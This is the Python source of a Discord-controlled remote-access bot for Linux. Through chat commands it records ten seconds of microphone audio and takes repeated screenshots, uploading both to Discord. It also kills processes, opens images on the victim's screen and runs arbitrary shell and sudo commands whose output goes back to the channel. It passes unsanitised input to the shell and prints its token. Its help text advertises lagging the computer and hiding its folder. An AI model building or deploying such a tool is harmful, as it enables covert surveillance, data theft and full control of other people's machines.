from logging import root
import os
import subprocess
import asyncio
import discord
from pynput.keyboard import Key, Controller
import sounddevice as sd
import soundfile as sf
import requests
import time
from dotenv import load_dotenv
from mss import mss
import shutil


# load env variables from .env file
load_dotenv()
token = os.getenv("Ethan")
if not token:
    load_dotenv(dotenv_path='C:\\announcer\\.env')
    token = os.getenv("Ethan")
print(f"Token value: {token}")


clientName = os.uname().nodename
selectedClient = "None"
timeout = 1
command_mode = False

sudo_password = None

print(clientName)

async def wifi_check():
    while True:
        try:
            requests.head("https://discord.com", timeout=timeout)
            print('The internet connection is active')
            break
        except requests.ConnectionError:
            print("The internet connection is down, retrying...")
            await asyncio.sleep(1)

asyncio.run(wifi_check())

def has_cmd(cmd):
    return shutil.which(cmd) is not None

def is_wayland():
    return os.environ.get("WAYLAND_DISPLAY") is not None

async def capture_screenshot(filename: str):
    def _capture():
        print("Wayland:", is_wayland())

        # --- 1. MSS (X11 only) ---
        if not is_wayland():
            try:
                with mss() as sct:
                    sct.shot(output=filename)
                if os.path.exists(filename):
                    print("Used MSS")
                    return True
            except Exception as e:
                print("MSS failed:", e)

        # --- 2. spectacle (KDE) ---
        if has_cmd("spectacle"):
            try:
                subprocess.run(
                    ["spectacle", "-b", "-n", "-o", filename],
                    check=True
                )
                if os.path.exists(filename):
                    print("Used spectacle")
                    return True
            except Exception as e:
                print("spectacle failed:", e)

        # --- 3. grim (Wayland) ---
        if has_cmd("grim"):
            try:
                subprocess.run(["grim", filename], check=True)
                if os.path.exists(filename):
                    print("Used grim")
                    return True
            except Exception as e:
                print("grim failed:", e)

        # --- 4. scrot (X11 fallback) ---
        if has_cmd("scrot"):
            try:
                subprocess.run(["scrot", filename], check=True)
                if os.path.exists(filename):
                    print("Used scrot")
                    return True
            except Exception as e:
                print("scrot failed:", e)

        return False

    ok = await asyncio.to_thread(_capture)

    # 🚨 CRITICAL FIX
    if not ok or not os.path.exists(filename):
        raise RuntimeError(
            "Screenshot failed: no working backend (install spectacle, grim, or scrot)"
        )

class MyClient(discord.Client):
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.cancelled = False

    async def on_disconnect(self):
        print("Bot disconnected from Discord (possible internet loss).")

    async def on_resumed(self):
        print("Bot reconnected to Discord.")

    async def on_ready(self):
        print(f'Logged on as {self.user}!')
        await self.change_presence(activity=discord.Game(name="Started!"))
        await asyncio.sleep(3)
        await self.change_presence(activity=discord.Game(name="Online, with linux"))

    async def on_message(self, message):
        global command_mode, sudo_password
        if message.author == self.user:
            return
        
        if not command_mode:
                if message.content.startswith('client '):
                    global selectedClient
                    
                    if message.content[7:].strip() == 'list':
                        await message.channel.send(f'Current selected client: {selectedClient} -- Available clients: {clientName}')
                        return
                    
                    selectedClient = message.content[7:].strip()
                    await message.channel.send(f'Selected client set to {selectedClient}')
                    return
                
                if message.content == 'help':
                    help_message = (
                        "# PLEASE RUN client list to select a client\n"
                        "# you cannot use the program without selecting a client\n"
                        "## Available commands (Legend: 🐧 = Linux | 🪟 = Windows | 🐧🪟 = Both):\n"
                        "rec - Record audio (🐧🪟)\n"
                        "upd - Update the application (🪟)\n"
                        "scr - Take a screenshot (🐧🪟)\n"
                        "tts - Text-to-speech (🪟)\n"
                        "msg - Display a message box (🪟)\n"
                        "lock - Lock the screen (🪟)\n"
                        "key - Send keystrokes (🪟)\n"
                        "close - Close a process (🐧🪟)\n"
                        "img - Display an image (🐧🪟)\n"
                        "vid - Display a video (🪟)\n"
                        "sound - Play a sound (🪟)\n"
                        "vol - Set the volume (🪟)\n"
                        "shortcut - Press a shortcut (🪟)\n"
                        "lag - Lag computer (CPU/RAM/GPU) (🪟)\n"
                        "cmd - Run a command (🪟)\n"
                        "cmdtoggle - Toggle command mode (🪟)\n"
                        "hide - Hide the announcer folder (🪟)\n"
                        "unhide - Unhide the announcer folder (🪟)\n"
                        "help - Show this help message (🐧🪟)\n"
                    )
                    await message.channel.send(help_message)

                if selectedClient != clientName and selectedClient != 'debug':
                    #cancel message if the client is not selected or if the message is not for this client
                    print(f'Message received for {selectedClient}, ignoring on {clientName}')
                    return
                
                if f'{message.content}' == 'cmdtoggle':
                   command_mode = True
                   await message.channel.send('Command mode enabled. Type "cmdtoggle" again to disable.')

                if message.content == 'cancel':
                    self.cancelled = True
                    await message.channel.send('Operation cancelled')
                    await asyncio.sleep(10)  # Give some time for ongoing operations to check the flag
                    self.cancelled = False # Reset for future operations
                    return
                
                #utility commands

                if message.content == 'rec':
                    await message.channel.send('Recording audio...')

                    try:
                        devices = sd.query_devices()
                    except Exception as e:
                        await message.channel.send(f'Could not query audio devices: {e}')
                        return

                    input_devices = [(i, d) for i, d in enumerate(devices) if d.get('max_input_channels', 0) > 0]
                    if not input_devices:
                        await message.channel.send('No input devices found on this system.')
                        return

                    list_lines = []
                    for local_idx, (sys_idx, dev) in enumerate(input_devices):
                        name = dev.get('name', 'Unknown')
                        list_lines.append(f"{local_idx}: {name} (system index {sys_idx})")

                    await message.channel.send('Available input devices:\n' + '\n'.join(list_lines) + '\nReply with the device number to use, or type "cancel" to abort. You have 30 seconds.')

                    def check(m):
                        return m.author == message.author and m.channel == message.channel

                    try:
                        reply = await self.wait_for('message', check=check, timeout=30)
                    except asyncio.TimeoutError:
                        await message.channel.send('No response received. Recording cancelled.')
                        return

                    if reply.content.lower().strip() == 'cancel':
                        await message.channel.send('Recording cancelled.')
                        return

                    try:
                        chosen_local = int(reply.content.strip())
                    except Exception:
                        await message.channel.send('Invalid selection. Please provide a number from the list.')
                        return

                    if not (0 <= chosen_local < len(input_devices)):
                        await message.channel.send('Selection out of range.')
                        return

                    sys_idx = input_devices[chosen_local][0]
                    dev_info = sd.query_devices(sys_idx)
                    samplerate = int(dev_info.get('default_samplerate') or 44100)
                    duration = 10 # seconds

                    await message.channel.send(f'Recording {duration}s from "{dev_info.get("name","Unknown")}"...')

                    def do_record(device_index, dur, sr):
                        sd.default.device = device_index
                        rec = sd.rec(int(dur * sr), samplerate=sr, channels=1, dtype='float32')
                        sd.wait()
                        return rec

                    try:
                        recording = await asyncio.to_thread(do_record, sys_idx, duration, samplerate)
                    except Exception as e:
                        await message.channel.send(f'Error during recording: {e}')
                        return

                    filename = f"recording_{int(time.time())}.wav"
                    try:
                        await asyncio.to_thread(sf.write, filename, recording, samplerate)
                    except Exception as e:
                        await message.channel.send(f'Could not save recording: {e}')
                        return

                    try:
                        await message.channel.send('Recording finished — sending file...')
                        await message.channel.send(file=discord.File(filename))
                    except Exception as e:
                        await message.channel.send(f'Could not send file: {e}')
                    finally:
                        try:
                            os.remove(filename)
                        except Exception:
                            pass

                    return
                
                # scr - Take a screenshot
                if message.content.startswith('scr'):
                    print('Taking screenshot(s)')
                    parts = message.content.strip().split()
                    if len(parts) == 2 and parts[1].isdigit():
                        amount = int(parts[1])
                        print(f'Taking {amount} screenshot(s)')
                        for i in range(amount):
                            if self.cancelled:
                                await message.channel.send('Screenshot operation cancelled.')
                                break
                            try:
                                await capture_screenshot('screenshot.png')
                            except Exception as e:
                                await message.channel.send(f'Could not take screenshot: {e}')
                                break
                            await message.channel.send(file=discord.File('screenshot.png'))
                            try:
                                os.remove('screenshot.png')
                            except Exception:
                                pass
                            await asyncio.sleep(1)
                        print('Screenshots taken')
                    else:
                        await message.channel.send('Incorrect syntax! Usage: scr <number>')
                
                """
                if message.content.startswith('key'):
                    keyboard = Controller()
                    await message.channel.send('Please enter the keystrokes you would like to send')
                    print('Waiting for keystrokes input...')
                    def check(m):
                        return m.author == message.author and m.channel == message.channel
                    msg = await self.wait_for('message', check=check)
                    time.sleep(1)  # Short delay before sending keystrokes
                    keyboard.type(msg.content)
                    print(f'Sent keystrokes: {msg.content}')
                    await message.channel.send('Keystrokes sent')
                """

                if message.content == 'close':
                    os.system('ps aux > tasklist.txt')
                    await message.channel.send(file=discord.File('tasklist.txt'))
                    os.remove('tasklist.txt')
                    await message.channel.send('Please enter the process process name or PID you would like to close')
                    def check(m):
                        return m.author == message.author and m.channel == message.channel
                    msg = await self.wait_for('message', check=check)
                    await message.channel.send(f'Closing {msg.content}')
                    os.system(f'pkill {msg.content}')

                if message.content == 'img':
                    await message.channel.send('Please upload the image you would like to display and state the amount of images you want to open (e.g. "3")')
                    def check(m):
                        return m.author == message.author and m.channel == message.channel and m.attachments
                    msg = await self.wait_for('message', check=check)
                    attachment = msg.attachments[0]
                    await attachment.save('temp_image.png')
                    def show_image():
                        # KDE / default handler first
                        kde_commands = [
                            ["kioclient5", "exec", "./temp_image.png"],
                            ["kde-open5", "./temp_image.png"],
                            ["xdg-open", "./temp_image.png"],
                        ]
                        for cmd in kde_commands:
                            try:
                                result = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                                if result.returncode == 0:
                                    return cmd[0]
                            except FileNotFoundError:
                                continue
                    
                    for _ in range(int(msg.content.strip().split()[-1])):
                        show_image()
                    time.sleep(3)
                    os.remove('temp_image.png')
                
                if message.content.startswith('cmd'):
                    def check(m):
                        return m.author == message.author and m.channel == message.channel
                    msg = message.content.strip().split(' ', 1)
                    if len(msg) < 2:
                        await message.channel.send('No command provided. Usage: cmd <your_command>')
                        return
                    if msg[1] == 'cmdtoggle':
                        command_mode = True
                        await message.channel.send('Command mode enabled, type "cmdtoggle" to disable')
                    else:
                        os.system(msg[1])
                        await message.channel.send(f'Command "{msg[1]}" executed, output was')
                        #send the output of the command
                        os.system(f'{msg[1]} > output.txt')
                        await message.channel.send(file=discord.File('output.txt'))
                        time.sleep(1)
                        os.remove('output.txt')
        else:
            if message.content == 'cmdtoggle':
                command_mode = False
                await message.channel.send('Command mode disabled.')

            elif message.content.startswith('sudopwd'):
                # Allow user to provide password inline: 'sudopwd <password>'
                parts = message.content.strip().split(None, 1)
                if len(parts) > 1:
                    sudo_password = parts[1].strip()
                else:
                    await message.channel.send('Please enter the sudo password to use for commands that require elevated privileges.')
                    def check(m):
                        return m.author == message.author and m.channel == message.channel
                    try:
                        msg = await self.wait_for('message', check=check, timeout=60)
                    except asyncio.TimeoutError:
                        await message.channel.send('Timed out waiting for password input.')
                        return
                    sudo_password = msg.content.strip()
                await message.channel.send('Sudo password set. You can now run commands with sudo by prefixing them with "sudocmd".')

            elif message.content.startswith('sudocmd'):
                if not sudo_password:
                    await message.channel.send('Sudo password not set. Please set it using "sudopwd" command.')
                    return
                cmd = message.content.strip().split(' ', 1)
                if len(cmd) < 2:
                    await message.channel.send('No command provided. Usage: sudocmd <your_command>')
                    return
                full_cmd = f'echo {sudo_password} | sudo -S {cmd[1]}'
                # Execute and capture output to file
                try:
                    with open('output.txt', 'w') as out:
                        subprocess.run(full_cmd, shell=True, stdout=out, stderr=subprocess.STDOUT, executable='/bin/bash')
                    await message.channel.send(f'Sudo command executed, output:')
                    await message.channel.send(file=discord.File('output.txt'))
                except Exception as e:
                    await message.channel.send(f'Error executing sudo command: {e}')
                finally:
                    try:
                        os.remove('output.txt')
                    except Exception:
                        pass

            else:
                # Run a normal shell command and return output
                cmd_text = message.content.strip()
                try:
                    with open('output.txt', 'w') as out:
                        subprocess.run(cmd_text, shell=True, stdout=out, stderr=subprocess.STDOUT, executable='/bin/bash')
                    await message.channel.send(f'Command "{cmd_text}" executed, output:')
                    await message.channel.send(file=discord.File('output.txt'))
                except Exception as e:
                    await message.channel.send(f'Error executing command: {e}')
                finally:
                    try:
                        os.remove('output.txt')
                    except Exception:
                        pass



intents = discord.Intents.default()
intents.message_content = True
client = MyClient(intents=intents)
client.run(str(token))